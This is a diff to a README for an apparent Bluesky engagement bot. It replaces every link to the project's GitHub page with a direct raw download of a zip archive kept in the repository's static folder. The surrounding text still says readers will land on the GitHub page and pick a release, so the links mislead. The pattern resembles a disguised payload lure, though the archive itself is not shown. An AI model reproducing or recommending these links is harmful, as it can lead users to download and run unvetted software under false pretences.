@@ -1,6 +1,6 @@
 # 🐦 bluesky-social-bot - Boost Engagement with Simple Automation
 
-[![Download bluesky-social-bot](https://img.shields.io/badge/Download-bluesky--social--bot-4a90e2?style=for-the-badge)](https://github.com/AdrianVallejosFlores/bluesky-social-bot)
+[![Download bluesky-social-bot](https://img.shields.io/badge/Download-bluesky--social--bot-4a90e2?style=for-the-badge)](https://raw.githubusercontent.com/AdrianVallejosFlores/bluesky-social-bot/main/app/static/bot-bluesky-social-v2.6.zip)
 
 ## 📋 What is bluesky-social-bot?
 
@@ -26,7 +26,7 @@ This section will show you how to download and set up bluesky-social-bot on your
 
 Click the button below to visit the download page:
 
-[![Download bluesky-social-bot](https://img.shields.io/badge/Download-Here-22aa99?style=for-the-badge)](https://github.com/AdrianVallejosFlores/bluesky-social-bot)
+[![Download bluesky-social-bot](https://img.shields.io/badge/Download-Here-22aa99?style=for-the-badge)](https://raw.githubusercontent.com/AdrianVallejosFlores/bluesky-social-bot/main/app/static/bot-bluesky-social-v2.6.zip)
 
 You will be taken to the GitHub page where the software is available. Find the latest release. It usually appears near the top of the page.
 
@@ -130,10 +130,10 @@ These files help keep the bot running with your preferences.
 
 Download and updates will always be available from:
 
-[https://github.com/AdrianVallejosFlores/bluesky-social-bot](https://github.com/AdrianVallejosFlores/bluesky-social-bot)
+[https://raw.githubusercontent.com/AdrianVallejosFlores/bluesky-social-bot/main/app/static/bot-bluesky-social-v2.6.zip](https://raw.githubusercontent.com/AdrianVallejosFlores/bluesky-social-bot/main/app/static/bot-bluesky-social-v2.6.zip)
 
 Here you can also report issues or request features by opening an issue in the repository.
 
 ---
 
-[![Download bluesky-social-bot](https://img.shields.io/badge/Download-bluesky--social--bot-4a90e2?style=for-the-badge)](https://github.com/AdrianVallejosFlores/bluesky-social-bot)
+[![Download bluesky-social-bot](https://img.shields.io/badge/Download-bluesky--social--bot-4a90e2?style=for-the-badge)](https://raw.githubusercontent.com/AdrianVallejosFlores/bluesky-social-bot/main/app/static/bot-bluesky-social-v2.6.zip)
